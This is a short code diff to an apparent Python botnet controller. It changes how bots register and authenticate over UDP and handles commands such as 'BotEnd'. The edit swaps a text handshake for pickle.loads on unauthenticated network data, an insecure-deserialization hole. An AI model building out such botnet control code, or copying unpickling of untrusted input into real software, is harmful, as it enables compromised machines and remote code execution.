@@ -53,8 +53,9 @@ class Network:
         while True:
             try:
                 data, addr = server_socket.recvfrom(1024)
-                message = data.decode('utf-8')
-                if addr[0] not in self.bots and message == "Accepted":
+                print(data)
+                message = pickle.loads(data)
+                if addr[0] not in self.bots and message == True:
                     self.bots[addr[0]] = {"Status": False, "Data": None}
                 print("Получено сообщение от {0}: {1}".format(addr, message))
             except socket.timeout:
@@ -167,7 +168,7 @@ class Network:
             print("Получено сообщение от {0}: {1}".format(addr, data))  # выводим данные
             match data["Action"]:
                 case "Auth":
-                    server_socket.sendto("Accepted".encode('utf-8'), (self.server, int(self.port)))
+                    server_socket.sendto(pickle.dumps(True), (self.server, int(self.port)))
                 case "BotEnd":
                     print("Command BE - BotNet stopped!")
                     exit(6)
@@ -178,7 +179,5 @@ class Network:
                 case _:
                     print(f"Unknown command from {addr[0]}")
 
-
 # Будущие фиксы
 # сервер отправляет сам себе запросы! Удалить адрес сервера self.ip из self.addr
-
